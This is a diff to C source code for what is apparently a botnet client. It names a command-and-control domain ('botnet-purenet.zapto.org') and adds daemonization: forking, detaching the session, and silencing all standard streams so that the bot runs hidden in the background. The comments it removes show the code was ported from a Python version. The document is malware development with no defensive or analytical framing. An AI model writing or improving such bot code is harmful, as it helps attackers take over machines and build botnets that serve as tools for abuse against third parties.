@@ -1,3 +1,5 @@
+#include <sys/types.h>
+#include <sys/stat.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -9,7 +11,7 @@
 #include <pthread.h>
 #include <time.h>
 #include <errno.h>
-#include <fcntl.h> // For non-blocking sockets
+#include <fcntl.h>
 
 // Configuration
 #define C2_ADDRESS "botnet-purenet.zapto.org"
@@ -803,21 +805,24 @@ void main_loop() {
 
 
 int main() {
-    // Python's if __name__ == '__main__': try: main() except: pass
-    // In C, main is the entry point. We call main_loop and catch errors.
-    // The Python 'except: pass' at the top level is unusual and means
-    // any error in the initial main() call is ignored.
-    // We can replicate this by simply calling main_loop and letting it handle its own errors.
-    // The recursive call in main_loop handles the reconnection logic.
+    pid_t pid = fork();
 
-    main_loop();
+    if (pid < 0) {
+        exit(EXIT_FAILURE); // Fork failed
+    }
+    if (pid > 0) {
+        exit(EXIT_SUCCESS); // Parent exits
+    }
 
-    // Free user agents memory before exiting (though main_loop is recursive,
-    // this part might not be reached if the program runs indefinitely).
-    // A proper cleanup would involve signals or a different loop structure.
-    // Sticking to the exact Python structure means this cleanup is omitted
-    // in the recursive loop scenario.
-    // free_user_agents(); // This would cause issues with the recursive main_loop
+    // Child continues
+    umask(0); // Set file mode mask
+    setsid(); // Create new session
 
-    return 0; // Should theoretically not be reached due to main_loop recursion
+    // Redirect standard files to /dev/null
+    freopen("/dev/null", "r", stdin);
+    freopen("/dev/null", "w", stdout);
+    freopen("/dev/null", "w", stderr);
+
+    main_loop(); // Start bot loop
+    return 0;
 }
